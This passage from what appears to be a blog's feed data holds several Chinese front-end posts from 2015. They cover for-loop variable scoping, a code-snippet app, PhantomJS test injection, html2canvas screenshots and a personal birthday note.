&#123;</span><br><span class="line">    console.log(i)<span class="comment">;</span></span><br><span class="line">  &#125;<span class="comment">;</span></span><br><span class="line">&#125;</span><br><span class="line">a[<span class="number">2</span>]()<span class="comment">; // 2</span></span><br></pre></td></tr></table></figure><p>let 只能在 block 块中生效，可以推测，应该是第一种方式解析，我们知道 <code>var</code> 会被提升（hoisting），所以第一种方式应该是：</p><figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line">var i<span class="comment">;</span></span><br><span class="line">&#123;var i <span class="operator">=</span> <span class="number">0</span><span class="comment">;  // code… &#125;</span></span><br><span class="line">&#123;var i <span class="operator">=</span> <span class="number">1</span><span class="comment">;  // code… &#125;</span></span><br><span class="line">&#123;var i <span class="operator">=</span> <span class="number">2</span><span class="comment">;  // code… &#125;</span></span><br></pre></td></tr></table></figure><p>显得十分别扭！到底是啥样的呢？好疑惑。</p><p>下面是 for 循环中包含 var 声明的执行流程：</p><p><img src="/../blogimgs/2015/09/30/20150903_d17189e4.jpg" alt="ES5-12.6.3"></p><p>章节地址：<a href="https://www.barretlee.com/ST/ES5.1/#sec-12.6.3">https://www.barretlee.com/ST/ES5.1/#sec-12.6.3</a></p><p>并没有说的太明白，我知道很多人肯定趋向第二种解释，感觉不是很对。</p><hr><p>咨询了下 Franky 教主，沟通之后，心里也有了结果。</p><p>ES5 和 ES6 不太一样，ES5 的 for 语句只有静态语义，而 ES6 的 for statement 存在两种语义，代码格式不同语义不同，分为静态语义和动态语义，上述 ES6 中的 let 关键词是因为 block 块具备动态语义，具体可以看这里：<a href="https://www.barretlee.com/ST/ES6/#sec-for-statement">https://www.barretlee.com/ST/ES6/#sec-for-statement</a>。</p><p>而 ES5 中 <code>var VariableDeclarationListNoIn</code> 是先声明，然后赋值。上图 ES5 文档中没有做出特殊说明，可以看出 var 变量并不会多次声明。</p><p>具体表述可能有些乱，但是心中的疑问总算是解开了。</p><p>对于这种原则性的问题，建议直接阅读 ES 文档。</p>]]></content>
      
      
      <categories>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> for </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>新应用上线 Snippet</title>
      <link href="/blog/2015/09/29/new-application-snippet/"/>
      <url>/blog/2015/09/29/new-application-snippet/</url>
      
        <content type="html"><![CDATA[<p>Snippet 是一款代码片段收集工具，经过一天三夜的开发终于上线了。</p><p><img src="/../blogimgs/2015/09/29/20150902_2774c376.jpg" alt="Snippet应用"></p><ul><li>应用地址：<a href="http://snippets.barretlee.com/">snippets.barretlee.com</a></li><li>源码地址：<a href="//github.com/barretlee/snippets">barretlee&#x2F;snippets</a></li></ul><p>由于使用原生 JS 开发，效果利用 CSS3 实现，所以如果想有一个好的视觉体验，请使用 Chrome&#x2F;FireFox 预览（后续会持续优化）。</p><span id="more"></span><h3 id="基本功能"><a href="#基本功能" class="headerlink" title="基本功能"></a>基本功能</h3><p>代码片段收集工具？你说的是 gist 么？这东西有用？昨天我在社交平台发上线预告的时候，有几个朋友提出来疑问。二话不多说，先去看<a href="http://snippets.barretlee.com/">线上效果</a>。</p><p>本应用使用 <a href="//jekyllrb.com">Jekyll</a> 构建，托管在 <a href="//github.com/barretlee/snippets">github</a> 上，提供了如下基本功能：</p><ul><li>Snippet 按照文件夹储存分类呈现</li><li>整合在一起之后，单页面预览所有 Snippet</li><li>提供了快捷的<strong>搜索功能</strong></li><li>每个 Snippet 对应 github 直接编辑的地址</li><li>提供了一个添加  Snippet 的快捷入口</li><li>Snippet 的语法就是 markdown ，当然也可以跟写博客似的写 snipet，嵌入 demo，嵌入说明等。</li></ul><p>所以只要有 github 权限，可以直接编辑代码，立即生效。</p><h3 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h3><p>一个小东西，硬生生开发了十几个小时。我对很多小细节扣的比较多，虽然自己不是设计出身，但是要求自己设计出来的东西能看、好看，所以常常走简约路线，复杂的设计搞不定。为了体验更好一些，我在页面上添加了几个小功能：</p><p><strong>1. 添加 snippet</strong></p><p><img src="/../blogimgs/2015/09/29/20150902_469e5db8.jpg" alt="add snippet"></p><p>进入页面之后，你可能看清楚了，左上角位置有个不是很明显的加号，点进去就会跑到 github 页面，由于是我的仓库，只有我能够直接编辑，其他人如果想添加代码段，需要 fork 过去之后，提交 PR，后续我会开发一个工具，方便其他人直接提交代码。</p><p><img src="/../blogimgs/2015/09/29/snippet.gif" alt="github add snippet"></p><p>新建文件夹十分方便，输入 <code>/foldName</code> 然后回车，github 就会自动建立一个文件夹，当然，如果文件夹存在，就会是进入文件夹。</p><p><strong>2. 搜索 snippet</strong></p><p><img src="/../blogimgs/2015/09/29/20150902_94f84521.jpg" alt="search snippet"></p><p>当我做完之后，发现找到一个自己收藏的 snippet 可真难，于是很自然的开发了一个搜索工具，搜索的范围是所有 snippet 的 title 名称，如果匹配到了就展示出来（当然，需要你点击 Enter 按钮）。</p><p><strong>3. 编辑 snippet</strong></p><p><img src="/../blogimgs/2015/09/29/20150902_d775b963.jpg" alt="edit snippet"></p><p>这个快捷入口直达该 snippet 的编辑地址，可以线上编辑，commit 之后立即生效。</p><p><img src="/../blogimgs/2015/09/29/20150902_f7fa36e1.jpg" alt="github editor"></p><p>这也是我为什么不使用 hexo 本地构建而使用 Jekyll 让 github 自动构建的目的（hexo 写插件用的语言是 nodejs，而 jekyll 是 ruby，所以各有利弊，本博客使用的就是 hexo 构建）。如果你喜欢这个 snippet ，可以点击编辑按钮左侧的小红心，哈哈~</p><h3 id="后续开发"><a href="#后续开发" class="headerlink" title="后续开发"></a>后续开发</h3><p>整个应用的开发，相对还是比较仓促的，存在比较多大的问题，所以后续有空也会不断优化它，直到我和大家用的都爽~ 那么，后续需要做的事情有：</p><ul><li>响应式预览页面</li><li>收集 snippet 的工具</li><li>补充更多类型 snippet，提升完整度</li><li>github 访问较慢，托管到 <a href="//gitcafe.com">gitcafe</a> 或者 <a href="//coding.net/">coding</a></li></ul><p>好了，如果大家喜欢这个应用，就去 <a href="//github.com/barretlee/snippets">github</a> 上 start&#x2F;fork 并且提交你的 snippet 吧！！</p><h3 id="贡献代码"><a href="#贡献代码" class="headerlink" title="贡献代码"></a>贡献代码</h3><p>如果你想贡献代码，可以执行如下操作：</p><ul><li>fork <a href="//github.com/barretlee/snippets.git">barretlee&#x2F;snippets</a> 仓库</li><li>然后执行如下命令</li></ul><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> //github.com/&#123;YOUR_GITHUB_NAME&#125;/snippets.git</span><br><span class="line"><span class="built_in">cd</span> snippets</span><br><span class="line">git chechout -b gh-pages</span><br><span class="line"><span class="built_in">cd</span> snippets</span><br><span class="line"><span class="comment"># 选择你想提交的文件类型，比如 html</span></span><br><span class="line"><span class="built_in">cd</span> html</span><br><span class="line"><span class="built_in">touch</span> &#123;YOUR_CONTRIBUTE_FILE_NAME&#125;.snippet</span><br></pre></td></tr></table></figure><p>其中，<code>&#123;YOUR_CONTRIBUTE_FILE_NAME&#125;.snippet</code> 的格式为：</p><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="attr">title:</span> &#123;<span class="string">NAME</span>&#125;</span><br><span class="line"><span class="meta">---</span></span><br><span class="line"><span class="meta"></span></span><br><span class="line">&#123;<span class="string">CONTENT</span>&#125;</span><br></pre></td></tr></table></figure><p>可以使用 markdown 语法。</p><ul><li>提交代码</li></ul><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">git <span class="keyword">add</span> <span class="comment">--all</span></span><br><span class="line">git <span class="keyword">commit</span> <span class="operator">-</span>m &quot;add file html/&#123;YOUR_CONTRIBUTE_FILE_NAME&#125;.snippet&quot;</span><br><span class="line">git push origin gh<span class="operator">-</span>pages</span><br></pre></td></tr></table></figure><ul><li>然后在你的 <a href="//github.com/%7BYOUR_GITHUB_NAME%7D/snippets/pulls">PR</a> 页面提交一个 PR 到 <code>barretlee/snippets</code> 的仓库</li></ul>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> snippets </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>走进 phantomjs 嵌入式测试</title>
      <link href="/blog/2015/09/25/move-on-phantomjs/"/>
      <url>/blog/2015/09/25/move-on-phantomjs/</url>
      
        <content type="html"><![CDATA[<p>Google 上搜索了下 phantomjs 关键词，展示最多的是测试和截屏相关的内容。phantomjs 提供了大量的 API，让我们可以操作 webkit 网页沙箱中的内容，也可以将网页中的信息输出到外层，进行分析处理。而本文着重要讲述的是，如何更好的与 webkit 网页沙箱交互，如何注入脚本，如何修改请求。</p><span id="more"></span><p>QA 测试最烦恼的是 UI 测试，包括网页元素的正确呈现，网页交互之后的元素变化等，人工测试很容易疏忽一些问题，并且 UI 层面的测试用例也不好写，这让人很头痛。为了让程序能够很好地分析页面 UI，也有很多人做了图片对比工具，通过 phantomjs 提供的 screen capture 功能，定时抓取页面截图，或者在不同的场景下抓取同一个页面的截图，在时间维度和空间维度上对页面图片做对比分析，做监控警报等。技术成本不是很高，但是为了个性需求需要做很多额外的工作。</p><h3 id="事件就是精确插入点"><a href="#事件就是精确插入点" class="headerlink" title="事件就是精确插入点"></a>事件就是精确插入点</h3><p>为了能够在精确的时间点注入测试脚本，我们需要了解下 phantomjs 在请求资源时会发生哪些事件，毕竟它也是一个事件驱动模型。</p><ul><li><code>onInitialized</code> 类似于我们发送 ajax 请求，状态为 0 的时候</li><li><code>onLoadStarted</code> 准备加载网页，此时页面的 <code>page.content</code> 是存在的，内容为 <code>&lt;html&gt;&lt;body&gt;&lt;/body&gt;&lt;/html&gt;</code></li><li><code>onLoadFinished</code> 页面加载完成，是 <code>DOMContentLoaded</code> 还是 <code>window.onload</code>，我稍微测试了下，感觉应该是后者</li><li><code>onResourceRequested</code> 请求资源，如 css、js 等</li><li><code>onResourceReceived</code> 请求的资源已到达</li><li><code>onClosing</code> 关闭页面</li><li><code>onConsoleMessage</code> 沙箱内的 console 内容是不会出现到外层的，通过这个函数可以输出</li></ul><p>还有很多，具体可以翻阅文档: <a href="http://phantomjs.org/api/webpage/">http://phantomjs.org/api/webpage/</a>。这些事件都是打开一个页面之后的实例化对象上的：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> page = <span class="built_in">require</span>(<span class="string">&#x27;webpage&#x27;</span>).<span class="title function_">create</span>();</span><br><span class="line"><span class="comment">// 事件监听</span></span><br><span class="line">page.<span class="title function_">onxxxx</span>();</span><br><span class="line">page.<span class="title function_">open</span>(url, <span class="keyword">function</span>(<span class="params"></span>)&#123;&#125;);</span><br></pre></td></tr></table></figure><p>用惯了 nodejs 的同学，可能会很自然的在代码里头写 </p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> page = <span class="built_in">require</span>(<span class="string">&#x27;webpage&#x27;</span>).<span class="title function_">create</span>();</span><br><span class="line"><span class="comment">// phantomjs API 没有这些东西</span></span><br><span class="line"><span class="keyword">var</span> http = <span class="built_in">require</span>(<span class="string">&#x27;http&#x27;</span>);</span><br></pre></td></tr></table></figure><p>我们需要搞清楚的是 phantomjs 是一个基于 webkit 内核的 JS API，webkit 包含两方面，一个是 webCore 解析 html，一个是 V8 解析和运行 javascipt，phantomjs 包含了 webkit 和基于 webkit 的 js 封装，相比单纯的 webkit 它提供了更多的 API。而 nodejs 是对 v8 的封装，在 v8 上做了一些上层建筑。要搞清楚 phantomjs 和 nodejs 之间的界限。</p><p>实际上，phantomjs 自己也做了一些类似 nodejs 的 API 包装，比如 webserver、child_process、FileSystem 等等，这些 API 可以让我们很方便的操作网络 IO 和系统进程。</p><h3 id="注入代码测试"><a href="#注入代码测试" class="headerlink" title="注入代码测试"></a>注入代码测试</h3><p>嵌入式指的是，将测试代码嵌入到 phantomjs 的沙箱之中，然后通过它提供的 API 将测试数据导出来，那么，如何将数据插入进去？</p><p><strong>1. includeJS&#x2F;injectJS注入文件</strong></p><p>两个函数都可以网沙箱内注入代码，区别是 <code>includeJS</code> 主要用于注入一个远程的脚本，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> webPage = <span class="built_in">require</span>(<span class="string">&#x27;webpage&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> page = webPage.<span class="title function_">create</span>();</span><br><span class="line"></span><br><span class="line">page.<span class="title function_">includeJs</span>(<span class="string">&#x27;http://code.jquery.com/jquery-1.10.2.min.js&#x27;</span>, <span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="comment">// 模拟登录</span></span><br><span class="line">  <span class="keyword">var</span> $testForm = $(<span class="string">&#x27;form#login&#x27;</span>);</span><br><span class="line">  $testForm.<span class="title function_">find</span>(<span class="string">&#x27;input[name=&quot;username&quot;]&#x27;</span>).<span class="title function_">value</span>(<span class="string">&#x27;barret&#x27;</span>);</span><br><span class="line">  $testForm.<span class="title function_">find</span>(<span class="string">&#x27;input[name=&quot;password&quot;]&#x27;</span>).<span class="title function_">value</span>(<span class="string">&#x27;1234&#x27;</span>);</span><br><span class="line">  $testForm.<span class="title function_">submit</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p><strong>2. evaluate注入代码</strong></p><p>而 <code>injectJS</code> 主要用于注入本地的文件，在做测试的时候，这个函数的使用频率稍高一些。很多的测试平台都是在线的，并且支持在线编写测试用例，最后生成的脚本地址当然也是网络可访问的，那么这个时候用 <code>includeJS</code> 就略微方便一些啦。</p><p>上面两种方式是想容器内注入可执行稳紧啊。除此之外，我们还可以使用 <code>evaluate</code> 直接注入可执行的脚本内容，如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> webPage = <span class="built_in">require</span>(<span class="string">&#x27;webpage&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> page = webPage.<span class="title function_">create</span>();</span><br><span class="line"></span><br><span class="line">page.<span class="title function_">open</span>(<span class="string">&#x27;http://www.taobao.com&#x27;</span>, <span class="keyword">function</span>(<span class="params">status</span>) &#123;</span><br><span class="line">  <span class="keyword">var</span> title = page.evaluate(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable language_">document</span>.<span class="property">title</span>;</span><br><span class="line">  &#125;);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(title);</span><br><span class="line">  phantom.<span class="title function_">exit</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>这种方式有点类似于我们在 chrome devtoos 的控制台中输入代码进行测试。</p><h3 id="搬出数据"><a href="#搬出数据" class="headerlink" title="搬出数据"></a>搬出数据</h3><p>注入代码拿到输出之后，我们需要将数据拿出来，在运行的环境中，可以通过如下手段将数据搬出来。</p><p><strong>1. 多开几个 webserver</strong></p><p>上面提到，phantomjs 提供了 webserver 方面的 API，我们可以在注入的代码中：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// part of inject.js</span></span><br><span class="line">$.<span class="title function_">post</span>(<span class="string">&quot;http://localhost:10220&quot;</span>, data, <span class="keyword">function</span>(<span class="params"></span>)&#123;</span><br><span class="line">  <span class="comment">// code..</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>向外部通讯，而我们在外部也准备好了接驾代码：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// part of server.js</span></span><br><span class="line"><span class="keyword">var</span> server = <span class="built_in">require</span>(<span class="string">&#x27;webserver&#x27;</span>).<span class="title function_">create</span>();</span><br><span class="line"><span class="keyword">var</span> port = <span class="number">10220</span>;</span><br><span class="line">server.<span class="title function_">listen</span>(port, <span class="keyword">function</span>(<span class="params">req, res</span>)&#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="title class_">JSON</span>.<span class="title function_">stringify</span>(req, <span class="literal">null</span>, <span class="number">2</span>));</span><br><span class="line">  <span class="comment">// coding...</span></span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure><p>所以 http 是个好东西，我们可以控制 web 的 server（沙箱外） 和 client（沙箱内），那么数据通讯就不是问题了。</p><p><strong>2. callPhantom 函数</strong></p><p>phantomjs 的 webpage 对象提供了一个 <code>onCallback</code> 函数，这个函数能够听到沙箱内一个叫做 <code>callPhantom</code> 函数的呐喊。<code>callPhantom</code> 是 phantomjs 在 window 上扩展的函数，他的使用：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> page = <span class="built_in">require</span>(<span class="string">&quot;webpage&quot;</span>).<span class="title function_">create</span>();</span><br><span class="line">page.<span class="property">onCallback</span> = <span class="keyword">function</span>(<span class="params">msg</span>) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这是沙箱说的话: &quot;</span> + msg);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;嘿，沙箱，我听到了！&quot;</span>;</span><br><span class="line">&#125;;</span><br><span class="line">page.evaluate(<span class="keyword">function</span>(<span class="params"></span>) &#123;</span><br><span class="line">    <span class="comment">// Return-value of the &quot;onCallback&quot; handler arrive here</span></span><br><span class="line">    <span class="keyword">var</span> callbackResponse = <span class="variable language_">window</span>.<span class="title function_">callPhantom</span>(<span class="string">&quot;嘿，外壳，我是沙箱~&quot;</span>);</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;这是外壳说的话: &quot;</span> + callbackResponse);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>所以一切都是那么简单！知道了这些之后，还有啥事我们办不成的呢？！</p><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p><code>Jasmine</code> 和 <code>QUnit</code> 是两套用的比较多的测试框架，我们可以使用上面任一种方式进行测试开发。</p><p>自动化测试少不了这些有用的工具，这些工具能够让我们在网页初始化的任何阶段注入测试代码，所以我们可以写好一堆测试用例，作为持续集成的测试库，让上线的代码更安全、更干净！</p>]]></content>
      
      
      <categories>
          
          <category> 工具 </category>
          
          <category> 前端杂烩 </category>
          
          <category> 网络交互 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phantomjs </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>使用 JavaScript 截屏</title>
      <link href="/blog/2015/09/24/screenshot-with-javascript/"/>
      <url>/blog/2015/09/24/screenshot-with-javascript/</url>
      
        <content type="html"><![CDATA[<p>经常在微博上看到很多内容使用的什么长微博截图，并且截图上还附加了很多其他的信息。之前对纯前端截图有些研究，正好本博客有这个需求，今天就把这东西实现了下。</p><span id="more"></span><p>需要声明的是，JavaScript 目前还不能实现网页截屏，就算以后能够实现，也一定是浏览器提供了相关接口，JS 去调用这些接口。既然不能截屏，那我们能做的只有通过拿到像素点的信息来”拼凑”图片。</p><h3 id="先说说我们看到的截屏方式"><a href="#先说说我们看到的截屏方式" class="headerlink" title="先说说我们看到的截屏方式"></a>先说说我们看到的截屏方式</h3><p>用过 phantomJS 的同学都知道，它提供了一个截屏函数，通过它可以整屏获取页面截图，而且他支持的格式也比较多：JPG&#x2F;PNG&#x2F;GIF&#x2F;PDF。通过简单的两句命令就可以把一个网页截取下来：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">// render.js</span></span><br><span class="line"><span class="keyword">var</span> webPage = <span class="built_in">require</span>(<span class="string">&#x27;webpage&#x27;</span>);</span><br><span class="line"><span class="keyword">var</span> page = webPage.<span class="title function_">create</span>();</span><br><span class="line"></span><br><span class="line">page.<span class="property">viewportSize</span> = &#123; <span class="attr">width</span>: <span class="number">1920</span>, <span class="attr">height</span>: <span class="number">1080</span> &#125;;</span><br><span class="line">page.<span class="title function_">open</span>(<span class="string">&quot;http://www.taobao.com&quot;</span>, <span class="keyword">function</span> <span class="title function_">start</span>(<span class="params">status</span>) &#123;</span><br><span class="line">  page.<span class="title function_">render</span>(<span class="string">&#x27;taobao_home.jpeg&#x27;</span>, &#123;<span class="attr">format</span>: <span class="string">&#x27;jpeg&#x27;</span>, <span class="attr">quality</span>: <span class="string">&#x27;100&#x27;</span>&#125;);</span><br><span class="line">  phantom.<span class="title function_">exit</span>();</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>安装 phantomjs 之后执行下上面的文件：</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">phantomjs render.js</span><br></pre></td></tr></table></figure><p>你会发现，一张宽度很窄的淘宝首页图就保存到了同目录下的 <code>taobao_home.jpeg</code> 中。也有同学使用 phantomjs 做了很多有意思的东西，比如每隔 100ms 截图，然后对比图像之间的差异，分析网页的加载情况和性能问题，甚至做网页的监控。好吧，话题收回来，继续说说其他的截屏方式，关于 phantomjs 可以移步到<a href="http://phantomjs.org/">官网</a>学习。</p><h3 id="前端截屏方案"><a href="#前端截屏方案" class="headerlink" title="前端截屏方案"></a>前端截屏方案</h3><p>能够导出图片的，目前只有 canvas。页面上的元素，除了图片、视音频、SVG等，其他都是文字，都可以使用 css 样式变换出来。我们知道，在 canvas 中是可以绘制图片和文字的，那么问题就很好解决了。</p><ul><li>遍历页面的所有元素，提取DOM数</li><li>获取渲染之后的每个 DOM 节点的内联、外链 CSS 属性</li><li>将样式转换成 canvas 的属性，利用 offset 等属性辅助摆放位置，将节点对应到 canvas 上</li></ul><p>这个方案比较粗糙，但是对于简单的页面，以上操作就能导出一张几乎与原状一模一样的图片。当然，我们想到的，也有人实现出来了，<code>html2canvas</code> 就是一个关注度很高的 js 截屏库，它考虑的内容会更多更全面。比如：</p><p><img src="/../blogimgs/2015/09/24/20150904_0187d488.jpg" alt="截屏分享"></p><p>我博客左侧的微博小图标，hover 上去有一个微博分享，这里我就使用了这个库截取博客全文视图（考虑小屏手机，我把宽度设置成 480，比较窄），其实现是很简单的：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">html2canvas</span>(<span class="variable language_">document</span>.<span class="property">body</span>).<span class="title function_">then</span>(<span class="keyword">function</span>(<span class="params">canvas</span>) &#123;</span><br><span class="line">   canvas.<span class="property">id</span> = <span class="string">&#x27;screenshotCanvas&#x27;</span>;</span><br><span class="line">   <span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(canvas);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>此时，页面的截图已经 append 到了 body 中。canvas 提供了导出图片的函数：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> can = documeng.<span class="title function_">getElementById</span>(<span class="string">&quot;screenshotCanvas&quot;</span>);</span><br><span class="line"><span class="keyword">var</span> imgDataURI = can.<span class="title function_">toDataURL</span>(<span class="string">&#x27;image/png&#x27;</span>);</span><br></pre></td></tr></table></figure><p>我们也可以将到处的内容转化成一个 blob 流，这样就能直接通过 URI 地址来访问了。</p><h3 id="原始需求是将图片分享出去"><a href="#原始需求是将图片分享出去" class="headerlink" title="原始需求是将图片分享出去"></a>原始需求是将图片分享出去</h3><p>无论是 dataURI 还是还是 blob 流，他们都没办法当做一个 URL 在网络上访问，所以当我使用微博分享（附加图片分享）的时候，图片总是拿不到。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> shareUrl = <span class="string">&quot;http://service.weibo.com/share/share.php?appkey=YOUR_APP_KEY&amp;title=&quot;</span> </span><br><span class="line">    + title + <span class="string">&quot;&amp;url=&quot;</span> + url + <span class="string">&quot;&amp;searchPic=false&amp;style=simple&amp;pic=&quot;</span> </span><br><span class="line">    + picUrl;</span><br></pre></td></tr></table></figure><p>这里的 picUrl 必须是一个 http 可请求到的地址，实在是无奈呀，在 <a href="http://coding.net/">coding.net</a> 写了一个小应用，用来临时储存图片（10分钟之后删除上传图片），有需要的可以试用下：</p><ul><li>源码地址：<a href="http://github.com/demo-platform/resolve-blob">http://github.com/demo-platform/resolve-blob</a></li><li>Demo地址：<a href="http://tmpfile.coding.io/">http://tmpfile.coding.io</a></li></ul><p>JQuery 用户可以这样搞：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="keyword">var</span> fd = <span class="keyword">new</span> <span class="title class_">FormData</span>();</span><br><span class="line">fd.<span class="title function_">append</span>(<span class="string">&quot;img&quot;</span>, imgBlob);</span><br><span class="line">$.<span class="title function_">ajax</span>(&#123;</span><br><span class="line">  <span class="attr">type</span>: <span class="string">&quot;POST&quot;</span>,</span><br><span class="line">  <span class="attr">url</span>: <span class="string">&quot;http://tmpfile.coding.io/img&quot;</span>,</span><br><span class="line">  <span class="attr">dataType</span>: <span class="string">&#x27;json&#x27;</span>,</span><br><span class="line">  <span class="attr">data</span>: fd,</span><br><span class="line">  <span class="attr">crossDomain</span>: <span class="literal">true</span>,</span><br><span class="line">  <span class="attr">processData</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">contentType</span>: <span class="literal">false</span>,</span><br><span class="line">  <span class="attr">success</span>: <span class="keyword">function</span>(<span class="params">data</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(data &amp;&amp; data.<span class="property">path</span>) &#123;    </span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;http://tmpfile.coding.io/tmp&quot;</span> + data.<span class="property">path</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><h3 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h3><p>只要能拿到原始图，之后的加工处理都是比较简单的。比如如何实现画框截取某个区域的图形，思路就是截取整图，记住鼠标按下和抬起的两个点，然后从整图中抠出来就搞定了。在 QQ 空间发表说说的地方有提供截屏工具，这是因为腾讯在电脑上安装了插件，并且提供了对应的 JS 接口，JS 是没有能力直接截屏的。</p><p>好吧，了解原理就好，人家有现成的库可以用，咱们不要动不动就造轮子，不好玩。</p>]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
          <category> JavaScript </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
            <tag> 截屏 </tag>
            
            <tag> html2cavans </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>好吧，今天是我的生日</title>
      <link href="/blog/2015/09/22/ok-today-its-my-birthday/"/>
      <url>/blog/2015/09/22/ok-today-its-my-birthday/</url>
      
        <content type="html"><![CDATA[<p>昨天晚上零点整，收到了高中老同桌的一条短信，太累了，没注意看就睡了。早上比往常醒的要早一些，打开手机，看到了昨晚的生日祝福语，掐指算了算，23了。依稀记得进大学的时候我的年龄还是比较小的，也依稀记得离开学校来到淘宝前端团队时被称为小鲜肉。</p><p>而如今，两撇小胡子，方形脸已经变成了正圆。</p><span id="more"></span><p><img src="/../blogimgs/2015/09/22/avatar150.png" alt="小胡子"></p><p>好吧，今天是我的生日。又是崭新的一天，也是崭新的一年，虽然需求如往常一样挤满了时间的空隙，可想说的还是要说出来。我很少去回忆过去，毕竟过去的都过去了；也很少去展望未来，因为要来的总会到来。</p><p><strong>关于爱情</strong></p><p>去年10月份，我认识了我的女朋友，从表白到今天已经 277 天。</p><img src="https://www.barretlee.com../blogimgs/2015/09/20150902_7e82534e.jpg" alt="小胡子和大额"  width="500" /><p>我们都在阿里巴巴，爱情可能就是一场邂逅。去年十月份的 D2 上，我们认识了彼此，虽然牵手的过程有点坎坷，但现在想来也只是一瞬间的事情。相伴相随才是今后最重要的话题。</p><p><strong>关于工作</strong></p><p>大学，在两个小创业公司里头蹦达，认识了很多朋友，也认识了很多靠谱的青年，那个时候我很明确自己的方向——我要工作。</p><p>然后就自然地走进了心中还比较满意的公司。去了北京，因为百度的待遇还不错，就没去体会北京的蜗居。我对百度伙食实在不满意，几个月下来，消瘦了些许。</p><p>所以当我找到杭州西厂的美食时，心中暗自狂喜道：”终于给我的肚子找了一个好的归宿”。我喜欢阿里巴巴的文化，也喜欢阿里巴巴的人。在这里，成长的不仅仅只是体重，还是技术。好多好多朋友希望我走出大公司，到外面看看，我想，我现在还是更喜欢这里。</p><p><strong>关于生活</strong></p><p>现在上得了厅堂、下得了厨房、翻得了围墙的不再是女生的专利。我觉得做饭是一种很有意思的消遣，我喜欢切菜，喜欢尝试做点好吃的东西（然而并不好吃）。</p><p><img src="/../blogimgs/2015/09/22/20150902_9dad8813.jpg" alt="life"></p><p>也希望这两年能多出去旅游，看看大好河山，看看古水人家。</p><p>新的一年，新的开始，加油！（需求方的电话来啦~）</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 生日 </tag>
            
            <tag> 展望 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>jQuery插件 - 文章图片弹出放大效果</title>
      <link href="/blog/2015/09/19/jquery-plugin-for-alert-img/"/>
      <url>/blog/2015/09/19/jquery-plugin-for-alert-img/</url>
      
        <content type="html"><![CDATA[<p>由于页面样式限制，部分图片预览效果并不是很好，网上找了下，没看到简洁满意的，自己写了一个十分简洁的。</p><span id="more"></span><p>源码地址：<a href="http://github.com/demo-platform/pop-img">http://github.com/demo-platform/pop-img</a></p><p>DEMO：<a href="http://demo-platform.github.io/pop-img/">http://demo-platform.github.io/pop-img/</a></p><p>本页测试（点击下方图片）：</p><img src="https://img.alicdn.com/imgextra/i3/O1CN01tDYnfz23AWT1ag79p_!!6000000007215-2-tps-1200-1200.png" loading="lazy"  alt="barretlee" width="100" />]]></content>
      
      
      <categories>
          
          <category> 前端杂烩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> jQuery </tag>
